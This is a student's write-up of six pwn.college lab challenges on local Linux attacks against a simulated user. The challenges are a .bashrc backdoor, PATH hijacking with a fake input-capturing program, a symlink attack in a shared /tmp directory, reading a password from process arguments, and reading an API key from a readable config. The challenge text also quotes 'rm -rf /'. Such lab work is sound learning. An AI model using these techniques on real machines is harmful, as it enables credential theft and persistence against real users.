# **1.<ins>Bashrc backdoor</ins>**:-
   In this challenge, we'll pretend that you've broken into a victim user's machine! That user is named `zardus`, with a home directory of `/home/zardus`. You, as the hacker user, have write access to his `.bashrc`, and zardus has read-access to `/flag`. The victim is simulated by the script `/challenge/victim`, and you can launch this script at any time to observe the victim logging into the computer.
## My solve:-
   **My flag** :-`pwn.college{o--wVxkhM7BYCIqNVQA32iA_Uhj.0VMzEzNxwCNxAzNzEzW}`

   So, the challenge asked us to change the script of the `.bashrc` of the user `zardus` so the it would print the flag and then rub` /challenge/victim`, hence i opened the shell and added the line `cat /flag` to `/home/zardus/.bashrc` script and then ran `/challenge/victim` and got the flag. 
   ```bash
   hacker@shenanigans~bashrc-backdoor:~$ nano /home/zardus/.bashrc
   hacker@shenanigans~bashrc-backdoor:~$ /challenge/victim
   Username: zardus
   Password: **********
   pwn.college{o--wVxkhM7BYCIqNVQA32iA_Uhj.0VMzEzNxwCNxAzNzEzW}
   zardus@shenanigans~bashrc-backdoor:~$ exit
   logout
   ```

### What i learned:-
   I learned that when our shell starts up, it looks for `.bashrc` file in your home directory and executes it as a startup script. You can customize our `/home/hacker/.bashrc` with useful things, such as setting environment variables, tweaking your shell configuration, and so on.

### Refference :-
   None


# **2.<ins>Sniffing input</ins>**:-
   In this challenge Zardus doesn't keep the flag lying around in a readable file after he logs in. Instead he'll run a command named `flag_checker`, manually typing the flag into it for verification.Your mission is to use your continued write access to Zardus's `.bashrc` to intercept this flag.
## My solve:-
   **My flag** :-`pwn.college{wP7scOIb6YHIFSsYL3PoLMNP4Rn.0VNzEzNxwCNxAzNzEzW}`

   So, the challenge asked us to get the flag that zardus writes, hence i opened the shell and then created a script `flag_checker` which prompts "Type the flag" and then cas the entered flag and stored it it `/home/hacker`, then i added this directory to his `PATH` in the `.bashrc` script using `export PATH="/home/hacker:$PATH"`, and then ran `/challenge/victim` and got the flag.
   ```bash
   hacker@shenanigans~sniffing-input:~$  nano flag_checker
   hacker@shenanigans~sniffing-input:~$  nano /home/zardus/.bashrc
   hacker@shenanigans~sniffing-input:~$ /challenge/victim
   Username: zardus
   Password: *********
   zardus@shenanigans~sniffing-input:~$ flag_checker
   Type the flag, victim:
   *************************************************************pwn.college{wP7scOIb6YHIFSsYL3PoLMNP4Rn.0VNzEzNxwCNxAzNzEzW}
   exit
   ```

### What i learned:-
   I learned that when our shell starts up, it looks for `.bashrc` file in your home directory and executes it as a startup script. You can customize our `/home/hacker/.bashrc` with useful things, such as setting environment variables, tweaking your shell configuration, and so on.

### Refference :-
   None


  # **3.<ins>Overshared directories</ins>**:-
   The challenge asks us to replicate the previous attack with write access to `/home/zardus` instead of `/home/zardus/.bashrc`.
## My solve:-
   **My flag** :-`pwn.college{omQWwZl8XhmRLdPsPd81z7iBacw.0FM0EzNxwCNxAzNzEzW}`

   So, the challenge asked us to replicate the previous attack with write access to `/home/zardus` instead of `/home/zardus/.bashrc`, hence i opened the shell and then created a script `flag_checker` which prompts "Type the flag" and then cas the entered flag and stored it it `/home/hacker`, then i removed the orginal `/home/zardus/.bashrc` and created a new `/home/zardus/.bashrc` and inserted this directory to his `PATH` by using output redirection on `echo export PATH="/home/hacker:$PATH"`, and then ran `/challenge/victim` and got the flag.
   ```bash
   hacker@shenanigans~sniffing-input:~$  nano flag_checker
   hacker@shenanigans~overshared-directories:~$ rm /home/zardus/.bashrc
   rm: remove write-protected regular file '/home/zardus/.bashrc'? y
   hacker@shenanigans~overshared-directories:~$ echo 'export PATH="/home/hacker:$PATH"' > /home/zardus/.bashrc
   hacker@shenanigans~overshared-directories:~$ /challenge/victim
   Username: zardus
   Password: **********
   zardus@shenanigans~overshared-directories:~$ flag_checker
   Type the flag, victim:
   *************************************************************pwn.college{omQWwZl8XhmRLdPsPd81z7iBacw.0FM0EzNxwCNxAzNzEzW}
   exit
   ```

### What i learned:-
   I learned that the problem is that a subtlety of Linux file/directory permissions is that anyone with write access to a directory can move and delete files in it. 

### Refference :-
   None


  # **4.<ins>Tricky linking</ins>**:-
   Okay, Zardus has wised up! No more sharing the home directory: despite the reduced convenience, Zardus has moved to sharing `/tmp/collab`. He's made that directory world-readable and has started a list of evil commands to remember!
```bash
zardus@dojo:~$ mkdir /tmp/collab
zardus@dojo:~$ chmod a+w /tmp/collab
zardus@dojo:~$ echo "rm -rf /" > /tmp/collab/evil-commands.txt
```
In this challenge, when you run `/challenge/victim`, Zardus will add cat /flag to that list of commands:
```bash
hacker@dojo:~$ /challenge/victim

Username: zardus
Password: **********
zardus@dojo:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@dojo:~$ exit
logout

hacker@dojo:~$
```
Recall from the previous level that, having write access to `/tmp/collab`, the hacker user can replace that `evil-commands.txt` file. Also remember from Comprehending Commands that files can link to other files. What happens if hacker replaces `evil-commands.txt` with a symbolic link to some sensitive file that zardus can write to? Chaos and shenanigans!
You know the file to link to. Pull off the attack, and get `/flag`.
## My solve:-
   **My flag** :-`pwn.college{0xW4M-mM50GOI2hwoTEQs6WL5ly.0VM0EzNxwCNxAzNzEzW}`

   So, the challenge asked us to replace `evil-commands.txt` file with a synbolic link that `zaedus` can write to, hence i opened the shell and first removed the contens of `evil-commands.txt` and then i linked it to `/home/zardus/.bashrc` and then invoked `/challenge/victim` once and the again ran `/challenge/victim` to get the flag.
   ```bash
   hacker@shenanigans~tricky-linking:~$ rm /tmp/collab/evil-commands.txt
   rm: remove write-protected regular file '/tmp/collab/evil-commands.txt'? y
   hacker@shenanigans~tricky-linking:~$ ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt
   hacker@shenanigans~tricky-linking:~$ /challenge/victim
   Username: zardus
   Password: ***********
   zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
   zardus@shenanigans~tricky-linking:~$ exit
   logout
   hacker@shenanigans~tricky-linking:~$ /challenge/victim
   Username: zardus
   Password: ***********
   pwn.college{0xW4M-mM50GOI2hwoTEQs6WL5ly.0VM0EzNxwCNxAzNzEzW}
   zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
   zardus@shenanigans~tricky-linking:~$ exit
   logout
   ```

### What i learned:-
   I learned that that the `t` bit at the end of the permissions is the sticky bit. The sticky bit means that the directory only allows the owners of files to rename or remove files in the directory. 

### Refference :-
   None


  # **5.<ins>Sniffing process arguments</ins>**:-
   In this challenge  Zardus is using an automation script, passing his account password to it as an argument. Zardus is also allowed to use `sudo` (and, thus, to `sudo cat /flag`!). Steal the password, log in to Zardus' account, and get that flag! 
## My solve:-
   **My flag** :-`pwn.college{YMAAU3VxgVFD47bpMRNFAPppuWl.0FOzEzNxwCNxAzNzEzW}`

   So, the challenge asked us to steal the password to Zardus' account and then log into it and print the flag, hence i opened  the shell and checked the process running on the system using the `ps aux` command and found the password i.e `pw_2217017539`, then i logged itnto zardus' account and used `sudo` to `cat` the flag.
   ```bash
   hacker@shenanigans~sniffing-process-arguments:~$ ps aux
   USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
   root           1  0.5  0.0   1056   640 ?        Ss   17:47   0:00 /sbin/docker-init -- /nix/var/nix/profiles/dojo-works
   root           7  0.3  0.0 231708  2560 ?        S    17:47   0:00 /run/dojo/bin/sleep 6h
   root         147  0.0  0.0   5204  3520 ?        S    17:47   0:00 su -c auto.sh --user zardus --pass pw_2217017539 zard
   zardus       151  0.0  0.0   4132  2560 ?        Ss   17:47   0:00 /bin/bash /run/challenge/bin/auto.sh --user zardus --
   zardus       152  0.0  0.0 231708  2560 ?        S    17:47   0:00 sleep 6h
   hacker       156  0.6  0.0 231576  3200 pts/0    Ss   17:47   0:00 /nix/store/0nxvi9r5ymdlr2p24rjj9qzyms72zld1-bash-inte
   hacker       162  0.0  0.0 231940  4160 pts/0    S    17:47   0:00 /run/dojo/bin/bash --login
   hacker       171  0.0  0.0 233600  3840 pts/0    R+   17:47   0:00 ps aux
   hacker@shenanigans~sniffing-process-arguments:~$ su zardus
   Password:
   zardus@shenanigans~sniffing-process-arguments:/home/hacker$ sudo cat /flag
   pwn.college{YMAAU3VxgVFD47bpMRNFAPppuWl.0FOzEzNxwCNxAzNzEzW}
   ```

### What i learned:-
   I learned that there data and be leked through command invocations. 

### Refference :-
   None


# **6.<ins>Snooping on configurations</ins>**:-
   In this level, users can use a valid API key to get the flag:
```bash
zardus@dojo:~$ flag_getter --key $FLAG_GETTER_API_KEY
Correct API key! Do you want me to print the key (y/n)? y
pwn.college{HACKED}
zardus@dojo:~$
```
Naturally, Zardus stores his key in `.bashrc`. Can you steal the key and get the flag?
## My solve:-
   **My flag** :-`pwn.college{k1fgWZgQPJny6p7XxQxfwvwa6Iw.0lM0EzNxwCNxAzNzEzW}`

   So, the challenge asked us to get the API key and then print the flag, hence i opened the shell and looked through the script of `/home/zardus.bashrc` and found the API key at the last line i.e `FLAG_GETTER_API_KEY=sk-108930068`, then i ran `flag_getter` and passed it and got the flag.
   ```bash
   hacker@shenanigans~snooping-on-configurations:~$ nano /home/zardus/.bashrc
   hacker@shenanigans~snooping-on-configurations:~$ flag_getter --key sk-108930068
   Correct API key! Do you want me to print the flag (y/n)?
   y
   pwn.college{k1fgWZgQPJny6p7XxQxfwvwa6Iw.0lM0EzNxwCNxAzNzEzW}
   ```

### What i learned:-
   I learned that even without making mistakes, users might inadvertently leave themselves at risk. For example, many files in a typical user's home directory are world-readable by default, despite frequently being used to store sensitive information. Believe it or not, your .bashrc is world-readable unless you explicitly change it!

### Refference :-
   None
